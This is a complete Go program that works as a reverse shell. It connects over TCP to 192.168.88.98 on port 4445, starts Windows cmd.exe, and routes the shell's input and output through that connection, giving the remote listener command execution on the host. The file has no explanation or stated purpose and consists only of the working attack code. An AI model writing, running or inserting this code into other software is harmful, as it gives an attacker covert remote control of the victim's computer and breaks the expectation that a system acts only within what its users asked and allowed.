package main

import (
	"net"
	"os/exec"
	"io"
)

func main() {
	conn, err := net.Dial("tcp", "192.168.88.98:4445")
	if err != nil {
		return
	}
	defer conn.Close()

	cmd := exec.Command("cmd.exe")

	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	cmd.Stderr = wp

	go io.Copy(conn, rp)
	cmd.Run()
}
